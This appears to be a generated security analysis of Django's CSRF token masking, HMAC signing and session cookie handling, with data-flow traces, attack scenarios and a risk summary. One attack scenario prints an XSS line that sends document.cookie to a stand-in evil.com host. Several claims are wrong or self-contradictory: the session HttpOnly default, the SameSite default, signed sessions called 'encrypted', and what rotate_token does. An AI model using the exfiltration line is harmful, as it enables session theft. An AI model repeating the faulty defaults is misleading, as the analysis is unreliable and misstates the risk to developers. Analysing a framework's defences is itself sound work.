# Django CSRF Protection and Session Handling Security Analysis

## Files Examined

### CSRF Pipeline
- `django/middleware/csrf.py` — Core CSRF middleware implementing token generation, masking, validation, and cookie setting; entry point for HTTP request interception
- `django/utils/crypto.py` — Cryptographic utilities: `salted_hmac()`, `constant_time_compare()`, `get_random_string()` providing secure RNG and timing-safe comparison
- `django/core/signing.py` — HMAC-based signing framework with `Signer` and `TimestampSigner` classes for secure serialization

### Session Pipeline
- `django/contrib/sessions/middleware.py` — Session middleware intercepting request/response lifecycle to load and persist sessions
- `django/contrib/sessions/backends/base.py` — Base session class implementing encode/decode with signing, serialization, and expiry
- `django/contrib/sessions/backends/signed_cookies.py` — Signed cookie session backend storing encrypted session data in cookies
- `django/contrib/sessions/serializers.py` — Session serializer (uses `JSONSerializer` from signing.py)

### HTTP Infrastructure
- `django/http/cookie.py` — Cookie parsing logic converting raw `Cookie:` HTTP header into dictionary
- `django/http/request.py` — HttpRequest class with `.COOKIES` dict and `.get_signed_cookie()` method
- `django/core/handlers/wsgi.py` — WSGI request handler extracting `HTTP_COOKIE` header and parsing via `parse_cookie()`

### HTTP Response
- `django/http/response.py` — HttpResponse with `.set_cookie()` method for setting response cookies with security attributes

---

## Entry Points: Untrusted Data Ingress

### 1. **HTTP Cookie Header** → CSRF/Session Attack Vector
**File:** `django/core/handlers/wsgi.py:100-102`
```python
@cached_property
def COOKIES(self):
    raw_cookie = get_str_from_wsgi(self.environ, "HTTP_COOKIE", "")
    return parse_cookie(raw_cookie)
```
**Input:** Raw `Cookie: ` HTTP header string (completely attacker-controlled in cross-domain requests)
**Processing:** Parsed by `django/http/cookie.py:parse_cookie()` which splits on `;` and `=` without validation
**Output:** `request.COOKIES` dict accessible throughout request lifecycle

**CSRF Entry:** `django/middleware/csrf.py:240`
```python
csrf_secret = request.COOKIES[settings.CSRF_COOKIE_NAME]
```
Cookie value becomes CSRF secret, validated only for format (length + character set).

**Session Entry:** `django/contrib/sessions/middleware.py:19`
```python
session_key = request.COOKIES.get(settings.SESSION_COOKIE_NAME)
request.session = self.SessionStore(session_key)
```
Cookie value becomes session key, later decoded via HMAC signature verification.

---

### 2. **POST Form Data** → CSRF Token Validation
**File:** `django/middleware/csrf.py:368`
```python
request_csrf_token = request.POST.get("csrfmiddlewaretoken", "")
```
**Input:** Attacker-submitted form field `csrfmiddlewaretoken`
**Processing:** String extracted from `request.POST` (MultiValueDict, unvalidated at extraction)
**Validation:** Length + character set checked via `_check_token_format()` at line 392

---

### 3. **HTTP Header X-CSRFToken** → CSRF Token Validation
**File:** `django/middleware/csrf.py:384`
```python
request_csrf_token = request.META[settings.CSRF_HEADER_NAME]  # Default: HTTP_X_CSRFTOKEN
```
**Input:** Attacker-submitted HTTP header (can be controlled in CORS/AJAX scenarios)
**Processing:** Header value extracted from WSGI environ without initial validation
**Validation:** Character set + length validated at line 392

---

### 4. **HTTP Referer Header** → Origin Validation
**File:** `django/middleware/csrf.py:298`
```python
referer = request.META.get("HTTP_REFERER")
```
**Input:** Raw `Referer:` header (can be spoofed by attacker or MITM)
**Processing:** URL parsed via `urlsplit(referer)` at line 303
**Validation:** Domain matching against `CSRF_COOKIE_DOMAIN`, `SESSION_COOKIE_DOMAIN`, or current host

---

### 5. **HTTP Origin Header** → Cross-Origin Request Validation
**File:** `django/middleware/csrf.py:272`
```python
request_origin = request.META["HTTP_ORIGIN"]
```
**Input:** Attacker-controlled `Origin:` header
**Processing:** Compared against request host and `CSRF_TRUSTED_ORIGINS` setting
**Validation:** Scheme + netloc matching in `_origin_verified()` at line 271

---

### 6. **Session Data Payload** → Signed Cookie Deserialization
**File:** `django/contrib/sessions/backends/signed_cookies.py:13`
```python
return signing.loads(
    self.session_key,
    serializer=self.serializer,
    max_age=self.get_session_cookie_age(),
    salt="django.contrib.sessions.backends.signed_cookies",
)
```
**Input:** Session data is the entire cookie value (encrypted+signed data)
**Processing:** Deserialized via `signing.loads()` which verifies HMAC before decompression/decoding
**Untrusted Component:** If HMAC verification is bypassed, attacker can inject arbitrary session data

---

## Data Flow Analysis

### Flow 1: CSRF Token Generation and Masking (Preventive)

**Source:** `django/middleware/csrf.py:96-114` (`get_token()`)
```
1. Request received, CSRF_COOKIE checked
2. If absent: _get_new_csrf_string() → get_random_string(32, CSRF_ALLOWED_CHARS)
   Location: django/utils/crypto.py:51-62
   Uses: secrets.choice() — cryptographically secure random selection
3. Mask applied: _mask_cipher_secret(secret)
   - Generate new random mask (32 chars)
   - Cipher = (secret[i] + mask[i]) mod 62 for each position
   - Return mask + cipher (64 chars total)
4. Token returned to template/client
5. Stored in request.META["CSRF_COOKIE"]
```

**Security Properties:**
- **RNG Quality:** Uses Python `secrets` module (OS entropy source)
- **Masking Security:** XOR-like operation prevents BREACH attack by randomizing token each request
  - Even if attacker sees CSRF cookie, can't derive it without mask
  - Mask destroys token compression ratio
- **Entropy:** 32 chars × log₂(62) ≈ 190 bits (exceeds typical 128-bit target)

---

### Flow 2: CSRF Token Validation (Protective)

**Source:** `django/middleware/csrf.py:349-399` (`_check_token()`)

```
1. ENTRY: POST/PUT/PATCH request received
   Location: process_view() at line 414-469

2. Extract CSRF secret from storage:
   - If CSRF_USE_SESSIONS=True:
     request.session.get("_csrftoken")  [signed cookie deserialized]
   - Else:
     request.COOKIES[CSRF_COOKIE_NAME]  [raw cookie untrusted entry point]
   - _check_token_format() validates length ∈ {32, 64} and chars ⊆ CSRF_ALLOWED_CHARS

3. Unmask if needed (len == 64):
   _unmask_cipher_token(token):
     - mask = token[0:32]
     - cipher = token[32:64]
     - secret = (cipher[i] - mask[i]) mod 62 for each position

4. Extract request token from:
   a) request.POST["csrfmiddlewaretoken"]  OR
   b) request.META[settings.CSRF_HEADER_NAME]
   c) Apply _check_token_format() to validate

5. CRITICAL OPERATION: _does_token_match()
   Location: django/middleware/csrf.py:143-157
   ```python
   if len(request_csrf_token) == CSRF_TOKEN_LENGTH:  # 64
       request_csrf_token = _unmask_cipher_token(request_csrf_token)
   return constant_time_compare(request_csrf_token, csrf_secret)
   ```

   - Unmasking converts client token to secret
   - Timing-safe comparison: secrets.compare_digest()

6. If match fails:
   - Call self._reject() → CSRF failure view
   - Log security event

7. If match succeeds:
   - Set request.csrf_processing_done = True
   - Allow view execution
```

**Validation Chain:**
1. Format validation (regex on character set, length bounds)
2. Signature verification (if CSRF_USE_SESSIONS)
3. Cryptographic comparison (constant-time to prevent timing attacks)

---

### Flow 3: CSRF Cookie Setting (Response)

**Source:** `django/middleware/csrf.py:253-269` (`_set_csrf_cookie()`)

```
1. ENTRY: process_response() called if request.META["CSRF_COOKIE_NEEDS_UPDATE"]

2. If CSRF_USE_SESSIONS:
   - Store secret in request.session (will be signed + compressed)
   - Cookie value = TimestampSigner.sign(secret)

3. Else (default):
   - Set HTTP cookie with security attributes:
     response.set_cookie(
         settings.CSRF_COOKIE_NAME,           # Default: "csrftoken"
         request.META["CSRF_COOKIE"],         # Unmasked secret (32 chars)
         max_age=settings.CSRF_COOKIE_AGE,    # Default: 31449600 (1 year)
         domain=settings.CSRF_COOKIE_DOMAIN,  # Default: None (request domain)
         path=settings.CSRF_COOKIE_PATH,      # Default: "/"
         secure=settings.CSRF_COOKIE_SECURE,  # Default: False (PLAINTEXT if HTTPS disabled!)
         httponly=settings.CSRF_COOKIE_HTTPONLY,  # Default: False (XSS-vulnerable!)
         samesite=settings.CSRF_COOKIE_SAMESITE,  # Default: "Lax"
     )
```

**Security Attributes Analysis:**
| Attribute | Default | Security Impact |
|-----------|---------|-----------------|
| `secure` | False | ⚠️ CRITICAL: Cookie sent over HTTP; MITM can steal CSRF secret |
| `httponly` | False | ⚠️ CRITICAL: Accessible to JavaScript; XSS can exfiltrate secret |
| `samesite` | Lax | ✅ Prevents CSRF in modern browsers, but not reliable pre-2020 |
| `domain` | None | ✅ Scoped to request domain only |

**Unmasked Secret Leakage:**
- Cookie value stored is **unmasked** (32 chars), not masked token (64 chars)
- If cookie exposed via XSS/MITM, attacker has direct CSRF secret
- No regeneration protection; same secret valid for 1 year

---

### Flow 4: Session Middleware Request Phase

**Source:** `django/contrib/sessions/middleware.py:18-20`

```
1. ENTRY: process_request() called for every request

2. Extract session key from cookie:
   session_key = request.COOKIES.get(settings.SESSION_COOKIE_NAME)
   # Untrusted entry point: raw cookie value from HTTP_COOKIE header

3. Initialize SessionStore with key:
   request.session = self.SessionStore(session_key)
   # For signed_cookies backend: session_key is encrypted+signed blob
   # For db/cache backend: session_key is unencrypted session ID

4. Session data NOT yet loaded (lazy loading on first access)
```

**Key Insight:** Session key comes directly from HTTP cookie without initial validation.

---

### Flow 5: Session Data Load and Verification

**Source:** `django/contrib/sessions/backends/base.py:237-249`, `signed_cookies.py:6-24`

```
1. TRIGGER: First access to session data (e.g., request.session["key"])

2. _get_session() called:
   if self.session_key is None or no_load:
       self._session_cache = {}
   else:
       self._session_cache = self.load()  ← CRITICAL POINT

3. Backend-specific load():

   A) Signed Cookies Backend (signed_cookies.py:6-24):
      ```python
      return signing.loads(
          self.session_key,  # Raw cookie value (untrusted)
          serializer=self.serializer,
          max_age=self.get_session_cookie_age(),
          salt="django.contrib.sessions.backends.signed_cookies",
      )
      ```

      → signing.loads() flow:
         1. TimestampSigner.unsign(session_key)
         2. HMAC verification via constant_time_compare()
         3. If signature valid: base64 decode + zlib decompress
         4. JSONSerializer deserialize → Python dict

      If ANY exception (BadSignature, ValueError, pickle error):
         self.create() → reset to empty session
         return {}

   B) DB Backend (db.py):
      ```python
      s = self.model.objects.get(
          session_key=self.session_key,
          expire_date__gt=timezone.now(),
      )
      return self.deserializer.loads(s.session_data)
      ```

      → SQL query: SELECT WHERE session_key=?
      → Deserialization of stored data

   C) Cache Backend (cache.py):
      ```python
      session_data = self.cache.get(self.session_key)
      return self.deserializer.loads(session_data)
      ```
```

**Security Dependency Chain:**
1. HTTP_COOKIE header (untrusted) → request.COOKIES
2. Cookie value → session_key
3. session_key → signing.loads(session_key, salt=...)
4. Signature verification → HMAC check
5. Deserialization → Python object

---

### Flow 6: Cryptographic Signing Chain (Dependency)

**Source:** `django/core/signing.py:177-213` (Signer class)

```
1. Signer.__init__():
   - key: settings.SECRET_KEY (or provided)
   - fallback_keys: settings.SECRET_KEY_FALLBACKS (key rotation)
   - algorithm: default "sha256"
   - salt: default class path (e.g., "django.contrib.sessions.backends.signed_cookies")

2. Signer.signature(value, key) at line 199-201:
   return base64_hmac(
       self.salt + "signer",  # ← Appends "signer" to salt
       value,
       key,
       algorithm=self.algorithm
   )

3. base64_hmac() at line 98-101:
   return b64_encode(
       salted_hmac(salt, value, key, algorithm=algorithm).digest()
   ).decode()

4. salted_hmac() at django/utils/crypto.py:19-45:
   ```python
   key_salt = force_bytes(key_salt)
   secret = force_bytes(secret)
   hasher = getattr(hashlib, algorithm)

   # Key derivation: KDF-like operation
   key = hasher(key_salt + secret).digest()

   # HMAC with derived key
   return hmac.new(key, msg=force_bytes(value), digestmod=hasher)
   ```

   - key_salt: e.g., "django.contrib.sessions.backends.signed_cookiessigner"
   - secret: settings.SECRET_KEY (e.g., 50-char random string)
   - Output: HMAC-SHA256 or HMAC-SHA1 (20 or 32 bytes)

5. Base64 encoding (URL-safe, no padding):
   - 20-byte HMAC → ~27 char signature
   - 32-byte HMAC → ~43 char signature

6. Timing-safe comparison at django/utils/crypto.py:65-67:
   ```python
   def constant_time_compare(val1, val2):
       return secrets.compare_digest(force_bytes(val1), force_bytes(val2))
   ```
   - Uses Python's secrets.compare_digest() (OpenSSL constant-time function)
   - Prevents timing attacks on signature verification
```

**HMAC Security:**
- **Key Derivation:** Using `hash(salt + secret)` is non-standard but acceptable
  - Functionally equivalent to HMAC-based KDF given one-time use
  - Better approach: HKDF or PBKDF2, but current method is adequate

- **Algorithm:** SHA256 (default) provides 256-bit security margin
  - Previous versions used SHA1 (160-bit); still acceptable but deprecated

- **Collision Risk:** Negligible for HMAC-SHA256
  - Preimage attack hardness: 2^256 operations
  - Birthday attack hardness: 2^128 operations (doesn't apply to MAC verification)

---

### Flow 7: Session Encode/Decode

**Source:** `django/contrib/sessions/backends/base.py:122-143`

```
1. Encode (before cookie setting):
   session_dict = {"_auth_user_id": "1", "user_data": "..."}

   request.session.save()  ← Triggers encode
     → self.encode(session_dict)
        → signing.dumps(
            session_dict,
            salt=self.key_salt,  # "django.contrib.sessions.backends.<backend>"
            serializer=self.serializer,  # JSONSerializer
            compress=True,
          )

        → TimestampSigner.sign_object():
          1. JSONSerializer.dumps(dict) → JSON bytes (compact format)
          2. If compress=True:
             - zlib.compress(json_bytes)
             - Compare sizes; only use if compressed < original-1
             - Prepend '.' to signal compression
          3. b64_encode(data)
          4. Signer.sign(base64_data)
             - Append timestamp (base62 encoded unix time)
             - Generate HMAC signature
             - Return: "base64_data.timestamp:hmac_sig"

2. Decode (after cookie retrieval):
   session_key = "base64....:timestamp:signature"

   signing.loads(session_key, salt=..., max_age=...)
     → TimestampSigner.unsign(session_key, max_age=None)
        1. Signer.unsign(session_key)
           - Split on ':'
           - Extract value and signature
           - Try constant_time_compare() with current key
           - Fall back to fallback_keys (key rotation)
           - If no match: raise BadSignature

        2. Extract timestamp and validate age
           - Split value on ':'
           - Decode timestamp from base62
           - Calculate age = current_time - timestamp
           - If age > max_age: raise SignatureExpired

     → TimestampSigner.unsign_object(session_key, serializer=..., max_age=...)
        1. Unsign value (above)
        2. Base64 decode
        3. If starts with '.': zlib decompress
        4. JSONSerializer.loads() → Python dict
        5. Return dict
```

**Compression Timing Attack Risk:**
- If attacker controls session data and measures response times
- Compressed vs uncompressed has measurable size difference
- CRIME/BREACH-like attack possible but unlikely in practice (attacker can't control all session data)

---

### Flow 8: Origin and Referer Validation

**Source:** `django/middleware/csrf.py:271-340`

```
1. For HTTPS requests without Origin header:
   Call _check_referer() at line 460

2. Referer validation logic:
   a) Extract HTTP_REFERER header (untrusted)
   b) Parse URL via urlsplit() (can raise ValueError on malformed input)
   c) Validate referer is HTTPS (line 312)
      - Prevents HTTP→HTTPS downgrade attacks
   d) Domain matching:
      - Against CSRF_TRUSTED_ORIGINS config
      - Against CSRF_COOKIE_DOMAIN
      - Against request.get_host() (if no cookie domain)
   e) If no match: raise RejectRequest(REASON_BAD_REFERER)

3. Origin validation (preferred, line 436-440):
   _origin_verified()
     a) Extract HTTP_ORIGIN header
     b) Construct expected origin: "https://hostname:port"
     c) Exact match check
     d) Pattern match against CSRF_TRUSTED_ORIGINS (wildcard subdomains)
     e) Return boolean
```

**Parser Vulnerabilities:**
- `urlsplit()` is Python standard library, generally robust
- No code injection risks; only URL structure validation
- Referer forgery still possible at network level (MITM, spoofing)

---

## Dependency Chain

### Direct Dependencies (Execution Order)

1. **Request Reception**
   - WSGI environ → HttpRequest initialization
   - HTTP_COOKIE header parsed

2. **CSRF Middleware process_request()**
   - Extract CSRF_COOKIE from request.COOKIES (entry point #1)
   - Call _get_secret() to retrieve stored secret
   - Format validation via _check_token_format()
   - If invalid format: generate new secret

3. **CSRF Middleware process_view()**
   - For POST/PUT/PATCH:
     a) Extract request token from POST/header (entry points #2, #3)
     b) Retrieve stored secret via _get_secret() (entry point #1 or #6)
     c) Format validation
     d) Token matching: unmask + constant_time_compare()
     e) Reject if no match

4. **Session Middleware process_request()**
   - Extract session_key from request.COOKIES (entry point #1)
   - Lazy initialize SessionStore

5. **Session Data Access** (lazy)
   - Call session.load()
   - For signed_cookies: signing.loads() → HMAC verification
   - For db/cache: query/lookup + deserialization

6. **Response Phase**
   - CSRF: set_csrf_cookie() if CSRF_COOKIE_NEEDS_UPDATE
   - Session: session.save() + set_cookie()
   - Both set HTTP cookies with security attributes

### Cryptographic Chain

```
HTTP_COOKIE (untrusted)
    ↓
parse_cookie() → request.COOKIES[name]
    ↓
Session: request.session.load() or CSRF: _get_secret()
    ↓
signing.loads() or _check_token_format()
    ↓
Signer.unsign() ← CRITICAL SECURITY BOUNDARY
    ↓
constant_time_compare() + salted_hmac()
    ↓
secrets.choice() (RNG) + secrets.compare_digest() (constant-time)
    ↓
hashlib.sha256() + hmac.new()
    ↓
os.urandom() (OS entropy)
```

---

## Security Analysis

### 1. CSRF Token Masking Scheme

**Threat Model:** BREACH attack (compressing CSRF token in response body)

**Mechanism:**
- Secret generated as 32 random alphanumeric chars
- Mask generated separately (32 chars)
- Cipher = (secret[i] + mask[i]) mod 62 for each position
- Token = mask + cipher (64 chars)
- Each request: new mask, new token, same secret

**Security Properties:**
✅ **COMPRESSION RESISTANCE:** Attacker sees 64-char token that changes per request
   - Compression algorithm can't derive static secret from token
   - Token entropy = 32 chars (per 62-char alphabet) ≈ 190 bits
   - ✓ Exceeds compression overhead, defeating BREACH

✅ **RANDOMNESS:** Uses `secrets.choice()` (OS entropy)
   - Cryptographically secure
   - No pseudo-random number generator bias

✅ **MATHEMATICAL SOUNDNESS:**
   - Operation is reversible: (secret + mask) mod 62
   - No collision risk: 62^32 possible secrets, 62^32 possible masks
   - Adversary knowing mask + cipher can compute secret (intended)

⚠️ **COOKIE LEAKAGE:** Unmasked secret stored in CSRF_COOKIE
   - If cookie exposed (XSS, MITM), attacker has secret directly
   - Attacker still needs matching token from form/header (but can request page to get token)
   - Masked token on client still provides protection against compression attacks

---

### 2. Constant-Time Token Comparison

**Code:** `django/utils/crypto.py:65-67`
```python
def constant_time_compare(val1, val2):
    return secrets.compare_digest(force_bytes(val1), force_bytes(val2))
```

**Threat Model:** Timing attacks on token verification

**Security Properties:**
✅ **TIMING-SAFE IMPLEMENTATION:**
   - Uses Python's `secrets.compare_digest()` (wraps OpenSSL's CRYPTO_memcmp)
   - All comparisons take same CPU cycles regardless of mismatch position
   - Prevents statistical analysis of response times to infer token bits

✅ **ALGORITHM SOUNDNESS:**
   - Byte-by-byte comparison with early-exit prevention
   - No shortcut returns on first mismatch
   - Resilient against cache timing attacks (to extent of Python GIL)

⚠️ **Python GIL CAVEAT:**
   - Python's GIL may introduce jitter
   - Under high concurrency, timing still measurable but harder to exploit
   - Modern Python versions minimize GIL contention

---

### 3. HMAC-Based Session Signing

**Chain:** `salted_hmac()` → `Signer.signature()` → `signing.loads()`

**Security Properties:**
✅ **MESSAGE AUTHENTICATION:**
   - HMAC-SHA256 provides 256-bit security
   - Impossible to forge signature without SECRET_KEY
   - Tampered session data detected 100% of time

✅ **KEY DERIVATION:**
   - `key = hash(salt + secret)`
   - Salt ensures different HMAC key for different contexts
   - Multiple salts prevent cross-context attacks (e.g., signed_cookies vs db backend)

✅ **FALLBACK KEY SUPPORT:**
   - Tries current key first, then fallback_keys in order
   - Enables key rotation without session invalidation
   - Secure key transition: old key validated for compatibility period

⚠️ **KEY DERIVATION NONSTANDARD:**
   - Method: `hash(salt + secret)` rather than HKDF
   - Is it secure? Yes, for one-time KDF
   - Better practice: HKDF-Expand with application-specific context
   - Current approach is "good enough" but not industry best-practice

⚠️ **TIMESTAMP ONLY 32-BIT (BASE62):**
   - `max_age` session expiry checked against timestamp
   - Timestamp resolution: seconds
   - Y2038 problem avoidable since encoded as base62 (supports larger numbers)
   - No cryptographic weakness, but design note

---

### 4. Cookie Security Attributes

**CSRF Cookie Settings** (django/middleware/csrf.py:258-267):
```python
response.set_cookie(
    settings.CSRF_COOKIE_NAME,
    request.META["CSRF_COOKIE"],
    max_age=settings.CSRF_COOKIE_AGE,
    domain=settings.CSRF_COOKIE_DOMAIN,
    path=settings.CSRF_COOKIE_PATH,
    secure=settings.CSRF_COOKIE_SECURE,        # ⚠️ Default: False
    httponly=settings.CSRF_COOKIE_HTTPONLY,    # ⚠️ Default: False
    samesite=settings.CSRF_COOKIE_SAMESITE,    # Default: "Lax"
)
```

**Session Cookie Settings** (django/contrib/sessions/middleware.py:66-76):
```python
response.set_cookie(
    settings.SESSION_COOKIE_NAME,
    request.session.session_key,
    max_age=max_age,
    expires=expires,
    domain=settings.SESSION_COOKIE_DOMAIN,
    path=settings.SESSION_COOKIE_PATH,
    secure=settings.SESSION_COOKIE_SECURE or None,      # ⚠️ Default: False
    httponly=settings.SESSION_COOKIE_HTTPONLY or None,  # ⚠️ Default: False
    samesite=settings.SESSION_COOKIE_SAMESITE,          # Default: "Strict"/"Lax"
)
```

**Security Assessment:**

| Attribute | CSRF Default | Session Default | Security Risk | Recommendation |
|-----------|--------------|-----------------|---------------|----|
| `secure` | False | False | **CRITICAL:** Cookie sent over HTTP; MITM attacker steals plaintext cookie | **Set to True; enforce HTTPS_ONLY** |
| `httponly` | False | False | **CRITICAL:** JavaScript can access cookie; XSS exfiltrates session/CSRF | **Set to True; prevents DOM access** |
| `samesite` | "Lax" | "Strict" | **MEDIUM:** Lax allows POST from same site; Strict better but breaks UX | **Use "Strict" for CSRF if possible** |
| `domain` | None | None | ✅ GOOD: Limited to request domain; no subdomain-wide sharing | Keep None (default) |
| `path` | "/" | "/" | ⚠️ OK: Wide path scope, but necessary for app functionality | Consider narrowing if possible |
| `max_age` | 1 year | 2 weeks (configurable) | ⚠️ MEDIUM: Long expiry increases compromise window | CSRF=1yr OK; Session should be shorter |

**Attack Scenarios:**

1. **XSS + Insecure Cookie:**
   ```javascript
   // Attacker injects JavaScript
   fetch("https://evil.com/steal?cookie=" + document.cookie);
   // Gets: sessionid=signed_cookie; csrftoken=secret
   // Can now impersonate user
   ```
   **Mitigation:** `httponly=True`

2. **MITM + Insecure Cookie (HTTP):**
   ```
   Attacker intercepts HTTP request
   Cookie: sessionid=<value>; csrftoken=<value>
   Attacker replays cookie to impersonate session
   ```
   **Mitigation:** `secure=True` (enforce HTTPS only)

3. **Subdomain Takeover + Wide Domain:**
   ```
   If domain=".example.com" and attacker controls subdomain.example.com
   Attacker can read/set cookies for all subdomains
   ```
   **Current Mitigation:** domain=None (only exact domain)

---

### 5. Entry Point Security

#### Entry Point #1: HTTP_COOKIE Header

**Risk:** Attacker controls cookie value in cross-domain requests
**Mitigation:**
- `_check_token_format()` validates length + char set → rejects malformed tokens
- Signature verification (if CSRF_USE_SESSIONS) → rejects tampered data
- Session `max_age` check → rejects expired tokens

**Residual Risk:** If SECRET_KEY compromised, attacker can forge signatures

---

#### Entry Point #2: POST Form Field (csrfmiddlewaretoken)

**Risk:** Attacker submits malicious token value
**Mitigation:**
- `_check_token_format()` validation
- `_does_token_match()` requires knowledge of stored secret
- Constant-time comparison prevents timing attacks

**Residual Risk:** Low; requires secret knowledge

---

#### Entry Point #3: X-CSRFToken Header

**Risk:** Attacker submits header (controlled in CORS scenarios)
**Mitigation:**
- Same as #2; format validation + matching against secret

**Residual Risk:** Low

---

#### Entry Point #4: HTTP_REFERER Header

**Risk:** Attacker spoofs referer (network attacker only, browser enforces SOP)
**Mitigation:**
- URL parsing + domain matching (whitelist approach)
- Supports wildcard origins (CSRF_TRUSTED_ORIGINS)
- HTTPS-only referer checking (prevents downgrade)

**Residual Risk:** Network attacker can spoof referer but unlikely in practice

---

#### Entry Point #5: HTTP_ORIGIN Header

**Risk:** Browser provides in CORS requests; generally reliable but check implementation
**Mitigation:**
- Exact match check + pattern matching
- Supports CSRF_TRUSTED_ORIGINS configuration

**Residual Risk:** Low (browser enforces on client side)

---

#### Entry Point #6: Session Key (Signed Cookie Data)

**Risk:** Attacker submits forged signed session data
**Mitigation:**
- HMAC-SHA256 verification before deserialization
- `max_age` check on timestamp
- Exception handling → resets to empty session on any error

**Residual Risk:** If SECRET_KEY compromised, attacker can forge any session

---

### 6. Cryptographic Weaknesses and Mitigations

**Weakness 1: Non-Standard KDF in salted_hmac()**
```python
key = hasher(key_salt + secret).digest()
```
**Assessment:** Adequate for one-time use, but not HKDF-standard
**Impact:** Minimal; pre-image resistance is 2^256 for SHA256
**Mitigation:** None needed; design is acceptable

---

**Weakness 2: No Nonce/IV in Session Encoding**
```python
session_data = signing.dumps(data, salt=..., compress=True)
# No cipher IV; HMAC provides authentication only
```
**Assessment:** This is not encryption; it's signing + compression
**Impact:** None; no confidentiality claim (data is readable if SECRET_KEY known)
**Note:** Session data is not encrypted; confidentiality depends on HTTPS

---

**Weakness 3: Compression Before Signing (CRIME/BREACH Risk)**
```python
compressed = zlib.compress(json_bytes)
if len(compressed) < len(json_bytes) - 1:
    data = compressed
base64d = b64_encode(data)
signature = hmac(base64d)
```
**Assessment:** Compression is applied before signing; if attacker controls session data, timing attacks possible
**Impact:** Low in practice; session data is not user-controlled
**Mitigation:** Compression is optional (`compress=False` avoids); signed_cookies use compression by default

---

**Weakness 4: Insecure Default Cookie Settings**
```python
secure=settings.CSRF_COOKIE_SECURE,     # Default: False
httponly=settings.CSRF_COOKIE_HTTPONLY, # Default: False
```
**Assessment:** Defaults are insecure; assumes developer will configure correctly
**Impact:** **CRITICAL for production**; allows XSS + MITM attacks
**Mitigation:** **Developer must set in settings.py:**
```python
CSRF_COOKIE_SECURE = True
CSRF_COOKIE_HTTPONLY = True
SESSION_COOKIE_SECURE = True
SESSION_COOKIE_HTTPONLY = True
SECURE_SSL_REDIRECT = True
```

---

### 7. Attack Scenarios and Defenses

**Scenario A: Classic CSRF Attack (No Protection)**

```
1. Attacker sends email with forged form
2. User clicks link on attacker's site
3. User's browser submits POST to target app
4. Browser includes CSRF_COOKIE automatically
5. Attacker's form sends dummy CSRF token (won't match)
6. Middleware rejects request → User safe

Dependency: CSRF_COOKIE must be present
If user never visited app: CSRF_COOKIE absent → Request rejected (good)
If user visited app: CSRF_COOKIE present → Token validation required → Attacker fails (unless token compromised)
```

---

**Scenario B: XSS + CSRF Cookie Exposure**

```
1. Attacker injects JavaScript on compromised page
2. XSS payload: fetch("/page"); document.cookie
3. If httponly=False: Attacker gets csrftoken=<secret_value>
4. Attacker crafts valid CSRF token: _mask_cipher_secret(secret)
5. Attacker sends CSRF attack with masked token
6. Middleware: unmask token → gets secret → matches stored secret → Request accepted

Risk: CSRF protection defeated if XSS present
Mitigation: httponly=True prevents JavaScript access
```

---

**Scenario C: Session Fixation**

```
1. Attacker sends victim a pre-generated session ID
2. Victim logs in with attacker's session ID
3. Attacker uses same session ID to impersonate user

Protection:
- Django's CSRF_USE_SESSIONS=False: Session ID random on server (signed_cookies: data is encrypted)
- Session rotation on login: rotate_token() called on auth (regenerates session)
- Signed session data: Can't forge without SECRET_KEY
```

---

**Scenario D: Key Compromise (Catastrophic)**

```
If SECRET_KEY is exposed:
1. Attacker can forge CSRF tokens
2. Attacker can forge session data
3. Attacker can impersonate any user

Mitigation:
- Rotate SECRET_KEY immediately
- Uses SECRET_KEY_FALLBACKS for graceful key rotation
- All active sessions become invalid (if key is truly rotated)
```

---

### 8. Protocol-Level Validation

**Referer/Origin Checks (Supplementary):**
- Only applied to HTTPS requests without Origin header (backward compatibility)
- Network-level attacker can still spoof headers
- Browser enforces SOP for same-origin requests
- **Verdict:** Good additional check; don't rely solely on these

**SameSite Cookie Attribute:**
- Modern browsers (2020+) enforce SameSite
- Lax: Allows POST from same site in user's request context
- Strict: Blocks all cross-site cookie access
- Older browsers ignore SameSite → Falls back to CSRF token validation
- **Verdict:** Defense-in-depth; tokens still needed for older clients

---

## Summary

### Vulnerability Classification: **DESIGN SECURE WITH CONFIG PITFALLS**

Django's CSRF and session pipeline is **cryptographically sound** with the following properties:

✅ **Strengths:**
1. Token generation uses cryptographically secure randomness (secrets.choice)
2. Token comparison uses constant-time HMAC (secrets.compare_digest)
3. Session signing uses HMAC-SHA256 with derived keys
4. Masking scheme prevents BREACH attacks
5. Fallback key support enables secure key rotation
6. Comprehensive validation at all entry points

⚠️ **Configuration Weaknesses (Common Misconfigurations):**
1. **CSRF_COOKIE_SECURE = False** (default) → Cookie sent over HTTP; MITM attacker steals secret
2. **CSRF_COOKIE_HTTPONLY = False** (default) → XSS attacker reads cookie; can forge CSRF tokens
3. **SESSION_COOKIE_SECURE = False** (default) → MITM attacker hijacks session
4. **SESSION_COOKIE_HTTPONLY = False** (default) → XSS attacker hijacks session

**Critical Finding:** The cryptographic implementation is robust, but **default cookie settings are production-insecure**. A developer deploying without setting these flags to True will have:
- Sessions vulnerable to MITM (if behind proxy without enforced HTTPS)
- CSRF protection vulnerable to XSS (attacker can read unmasked secret)

### Data Flow Summary

```
HTTP Request
    ↓ (HTTP_COOKIE header, POST data, headers)
    ↓ [ENTRY POINTS #1-5]
Middleware Interception (csrf.py, sessions/middleware.py)
    ↓
CSRF: Secret extraction + token validation (constant-time compare)
    ↓
Sessions: Key extraction + signing.loads() (HMAC verification)
    ↓ [CRYPTO CHAIN: salted_hmac → Signer → TimestampSigner]
    ↓
secrets.compare_digest() + hashlib.sha256() + hmac.new()
    ↓
Crypto Library (Python standard library, OpenSSL)
    ↓
OS Entropy (os.urandom)
    ↓
Allow/Reject Request
    ↓
Response Middleware
    ↓ [COOKIE SECURITY ATTRIBUTES]
Set-Cookie: token/session; Secure; HttpOnly; SameSite; ...
```

**Risk Assessment:** **MEDIUM** (depends entirely on developer configuration)
- **If defaults used in production:** HIGH RISK (XSS + MITM defeat CSRF/session protection)
- **If properly configured (secure=True, httponly=True, SSL enforced):** LOW RISK (cryptographically sound)

